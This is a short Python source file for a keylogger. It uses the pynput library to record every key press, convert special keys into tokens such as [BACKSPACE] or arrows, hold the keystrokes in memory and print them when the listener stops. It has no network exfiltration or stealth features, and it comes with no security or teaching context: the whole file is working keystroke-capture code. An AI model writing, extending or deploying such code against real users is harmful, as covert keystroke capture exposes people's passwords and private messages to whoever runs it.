from pynput import keyboard
import time

class KeyLogger:
    def __init__(self):
        self.listener = None
        self.logs = []


    def on_press(self, key):
        special_keys = {
            'Key.space': " ",
            'Key.enter': "\n",
            'Key.backspace': "[BACKSPACE]",
            'Key.shift': "[SHIFT]",
            'Key.ctrl': "[CTRL]",
            'Key.alt': "[ALT]",
            'Key.tab': "[TAB]",
            'Key.esc': "[ESC]",
            'Key.delete': "[DELETE]",
            'Key.caps_lock': "[CAPS_LOCK]",
            'Key.up': "↑",
            'Key.down': "↓",
            'Key.left': "←",
            'Key.right': "→"
        }

        key = str(key).replace("'", "")
        if key in special_keys:
            key = special_keys[key]
        self.logs.append(key)


    def get_logs(self):
        data = "".join(self.logs)
        self.logs.clear()
        return data


    def start_listen(self):
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()



    def stop_listen(self):
        if self.listener:
            self.listener.stop()
            print(self.get_logs())


if __name__ == '__main__':
    r = KeyLogger()
    r.start_listen()



